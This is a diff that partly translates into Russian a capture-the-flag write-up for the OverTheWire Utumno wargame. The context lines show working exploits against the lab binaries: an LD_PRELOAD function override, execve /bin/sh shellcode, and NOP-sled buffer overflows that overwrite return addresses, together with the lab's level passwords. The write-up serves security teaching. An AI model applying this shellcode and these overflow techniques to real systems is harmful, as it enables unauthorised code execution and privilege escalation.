@@ -1,7 +1,7 @@
 ---
-title: "[OTW] Write-up for the Utumno Wargame"
+title: "[OTW] Разбор варгейма Utumno"
 permalink: /writeups/otw/utumno/
-excerpt: "Quick write-up for the Utumno wargame from OverTheWire."
+excerpt: "Краткий разбор варгейма Utumno с OverTheWire."
 ---
 
 ---
@@ -15,7 +15,7 @@ Kick back and relax, it's gonna be fun !
 
 ![image-center](/images/otw/wargame.gif){: .align-center}
 
-## Utumno 00 Solution
+## Решение Utumno 00
 
 **SSH :** *ssh utumno0@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *utumno0*
@@ -33,9 +33,9 @@ Hum, weird. Maybe `file` can help us.
 ```bash
 utumno0@utumno:/utumno$ file ./utumno0
 ./utumno0: executable, regular file, no read permission
-``` 
+```
 
-**Note:** Here, **GDB** will be useless as we don't have read permission. You need to be creative. 
+**Заметка:** Here, **GDB** will be useless as we don't have read permission. You need to be creative.
 {: .notice--info}
 
 After some research, I decided to use the **LD_PRELOAD** environment variable. Basically, if your executable is dynamically linked, you can load a library to override (or replace) any functions or symbols preloaded from other libraries. If you don't know about **LD_PRELOAD**, you can read my post: [Playing with LD_PRELOAD](https://axcheron.github.io/playing-with-ld_preload/).
@@ -44,7 +44,7 @@ In our case, we got an output message saying **"Read me! :P"** (but, we can't re
 
 However, we don’t really know which function is used to display the message (*fprintf()*, *printf()*, *puts()*, etc.). But it’s not really an issue, we can try each of them, I’ll start with **puts()**. Why ? Well, *puts()* is merely primitive version of *printf()* so, most of the time, if the call to *printf()* does not use any format string the **gcc** compiler will optimize *printf()* with a *puts()* call.
 
-**Note:** I created a directory in `/tmp` to create and compile my library.
+**Заметка:** I created a directory in `/tmp` to create and compile my library.
 {: .notice--info}
 
 ```c
@@ -53,7 +53,7 @@ However, we don’t really know which function is used to display the message (*
 int puts ( const char * str ) {
 	printf("Hello from 'puts' !");
 
-	return 0;	
+	return 0;
 }
 ```
 
@@ -115,7 +115,7 @@ password: [..removed..]
 
 The first one was tough, but we did it !
 
-## Utumno 01 Solution
+## Решение Utumno 01
 
 **SSH :** *ssh utumno1@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *aathaeyiew*
@@ -188,7 +188,7 @@ Breakpoint 1, 0x080484a4 in run (p=0x804a032) at utumno1.c:27
 
 Basically, I put a breakpoint at the `ret` instruction of the *run* function. You can see that the return address starts with `0x41414141`. It means that anything placed after **sh_** is executed as code. So, we need to create a filename with a shellcode embedded.
 
-We just need to write a shellcode. Here, I choose to create a *symbolic link* on **/bin/sh** and call it using a custom shellcode. 
+We just need to write a shellcode. Here, I choose to create a *symbolic link* on **/bin/sh** and call it using a custom shellcode.
 
 ```nasm
 global _start
@@ -207,7 +207,7 @@ mov al, 0xb ; sys_execve
 int 0x80
 ```
 
-We compile it, create a symlink and extract the shellcode. 
+We compile it, create a symlink and extract the shellcode.
 
 ```bash
 utumno1@utumno:/tmp/ax$ nasm -f elf32 shell.asm
@@ -225,14 +225,14 @@ ceewaceiph
 
 Almost easy !
 
-## Utumno 02 Solution
+## Решение Utumno 02
 
 **SSH :** *ssh utumno2@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *ceewaceiph*
 
 In this level, the only result we get from the executable is **"Aw.."**. So, we'll analyse it with **GDB**:
 
- 
+
 ```nasm
 utumno2@utumno:/utumno$ gdb -q ./utumno2
 Reading symbols from ./utumno2...done.
@@ -387,7 +387,7 @@ Then, we modify our code :
 #include <unistd.h>
 
 void main() {
-    char *envp[] = {"", "", "", "", "", "", "", "", 
+    char *envp[] = {"", "", "", "", "", "", "", "",
         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
         "AAAABBBBCCCCDDDDEEEE",
         NULL};
@@ -449,7 +449,7 @@ Here I choose `0xffffdfb0` as it point on my NOP sled. Then we recompile the cod
 #include <unistd.h>
 
 void main() {
-    char *envp[] = {"", "", "", "", "", "", "", "", 
+    char *envp[] = {"", "", "", "", "", "", "", "",
         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
         "AAAABBBBCCCCDDDD\xb0\xdf\xff\xff",
         NULL};
@@ -469,7 +469,7 @@ $
 
 Done.
 
-## Utumno 03 Solution
+## Решение Utumno 03
 
 **SSH :** *ssh utumno3@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *zuudafiine*
@@ -486,33 +486,33 @@ This one was a tough one. Here, your input will be used to overwrite the return 
 0x080483fc <+17>:	mov    DWORD PTR [ebp-0x8],eax
 0x080483ff <+20>:	jmp    0x804844d <main+98>
 0x08048401 <+22>:	mov    eax,DWORD PTR [ebp-0xc]
-0x08048404 <+25>:	mov    ecx,eax 
+0x08048404 <+25>:	mov    ecx,eax
 0x08048406 <+27>:	lea    edx,[ebp-0x3c]
 0x08048409 <+30>:	mov    eax,DWORD PTR [ebp-0x8] ;
-0x0804840c <+33>:	add    eax,edx 
-0x0804840e <+35>:	mov    BYTE PTR [eax],cl 
-0x08048410 <+37>:	lea    edx,[ebp-0x3c] 
+0x0804840c <+33>:	add    eax,edx
+0x0804840e <+35>:	mov    BYTE PTR [eax],cl
+0x08048410 <+37>:	lea    edx,[ebp-0x3c]
 0x08048413 <+40>:	mov    eax,DWORD PTR [ebp-0x8]
 0x08048416 <+43>:	add    eax,edx
-0x08048418 <+45>:	movzx  ecx,BYTE PTR [eax] 
-0x0804841b <+48>:	mov    eax,DWORD PTR [ebp-0x8] 
-0x0804841e <+51>:	mov    edx,eax 
-0x08048420 <+53>:	mov    eax,edx 
-0x08048422 <+55>:	add    eax,eax 
-0x08048424 <+57>:	add    eax,edx 
-0x08048426 <+59>:	xor    ecx,eax 
-0x08048428 <+61>:	lea    edx,[ebp-0x3c] 
-0x0804842b <+64>:	mov    eax,DWORD PTR [ebp-0x8] 
-0x0804842e <+67>:	add    eax,edx 
-0x08048430 <+69>:	mov    BYTE PTR [eax], cl 
-0x08048432 <+71>:	lea    edx,[ebp-0x3c] 
-0x08048435 <+74>:	mov    eax,DWORD PTR [ebp-0x8] 
-0x08048438 <+77>:	add    eax,edx 
-0x0804843a <+79>:	movzx  eax, BYTE PTR [eax] 
-0x0804843d <+82>:	movsx  ebx,al 
-0x08048440 <+85>:	call   0x80482c0 <getchar@plt> 
-0x08048445 <+90>:	mov    BYTE PTR [ebp+ebx*1-0x24],al 
-0x08048449 <+94>:	add    DWORD PTR [ebp-0x8],0x1 
+0x08048418 <+45>:	movzx  ecx,BYTE PTR [eax]
+0x0804841b <+48>:	mov    eax,DWORD PTR [ebp-0x8]
+0x0804841e <+51>:	mov    edx,eax
+0x08048420 <+53>:	mov    eax,edx
+0x08048422 <+55>:	add    eax,eax
+0x08048424 <+57>:	add    eax,edx
+0x08048426 <+59>:	xor    ecx,eax
+0x08048428 <+61>:	lea    edx,[ebp-0x3c]
+0x0804842b <+64>:	mov    eax,DWORD PTR [ebp-0x8]
+0x0804842e <+67>:	add    eax,edx
+0x08048430 <+69>:	mov    BYTE PTR [eax], cl
+0x08048432 <+71>:	lea    edx,[ebp-0x3c]
+0x08048435 <+74>:	mov    eax,DWORD PTR [ebp-0x8]
+0x08048438 <+77>:	add    eax,edx
+0x0804843a <+79>:	movzx  eax, BYTE PTR [eax]
+0x0804843d <+82>:	movsx  ebx,al
+0x08048440 <+85>:	call   0x80482c0 <getchar@plt>
+0x08048445 <+90>:	mov    BYTE PTR [ebp+ebx*1-0x24],al
+0x08048449 <+94>:	add    DWORD PTR [ebp-0x8],0x1
 0x0804844d <+98>:	call   0x80482c0 <getchar@plt>
 0x08048452 <+103>:	mov    DWORD PTR [ebp-0xc],eax
 0x08048455 <+106>:	cmp    DWORD PTR [ebp-0xc],0xffffffff
@@ -526,7 +526,7 @@ This one was a tough one. Here, your input will be used to overwrite the return 
 0x0804846b <+128>:	ret
 ```
 
-If you take a look at the code we have two call to *getchar()* (`main+85` and `main+98`). The first call will be used to specify **where** you want to write (the offset) and the second will be **what** you want to write (the return address). We'll have to do that one byte at a time. Based on that assumption, our payload to overwrite the return address will be 8 bytes long (4 locations + 4 bytes to write). 
+If you take a look at the code we have two call to *getchar()* (`main+85` and `main+98`). The first call will be used to specify **where** you want to write (the offset) and the second will be **what** you want to write (the return address). We'll have to do that one byte at a time. Based on that assumption, our payload to overwrite the return address will be 8 bytes long (4 locations + 4 bytes to write).
 
 The important part is at `main+90` where you can see `mov BYTE PTR [ebp+ebx*1-0x24], al`. This line will compute the address where your return address will be overwrote. First, let's get **EBP** and the location of the return address.
 
@@ -679,7 +679,7 @@ oogieleoga
 
 If your math is right, you get the password.
 
-## Utumno 04 Solution
+## Решение Utumno 04
 
 **SSH :** *ssh utumno4@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *oogieleoga*
@@ -789,7 +789,7 @@ woucaejiek
 
 Easy !
 
-## Utumno 05 Solution
+## Решение Utumno 05
 
 **SSH :** *ssh utumno5@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *woucaejiek*
@@ -1004,7 +1004,7 @@ eiluquieth
 
 Done !
 
-## Utumno 06 Solution
+## Решение Utumno 06
 
 **SSH :** *ssh utumno6@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *eiluquieth*
@@ -1164,7 +1164,7 @@ First, we export a shellcode with a generous NOP sled.
 utumno6@utumno:/utumno$ export EGG=$(python -c "print 300 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
 ```
 
-Now, based on our previous discovery, we will segfault the executable to get the address pointed by **ESP**. 
+Now, based on our previous discovery, we will segfault the executable to get the address pointed by **ESP**.
 
 ```nasm
 utumno6@utumno:/utumno$ gdb -q ./utumno6
@@ -1246,7 +1246,7 @@ totiquegae
 
 Done.
 
-## Utumno 07 Solution
+## Решение Utumno 07
 
 **SSH :** *ssh utumno7@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *totiquegae*
@@ -1485,7 +1485,7 @@ jaeyeetiav
 $
 ```
 
-## Utumno 08 Solution
+## Решение Utumno 08
 
 **SSH :** *ssh utumno8@utumno.labs.overthewire.org -p 2227*<br/>
 **Pass :** *jaeyeetiav*
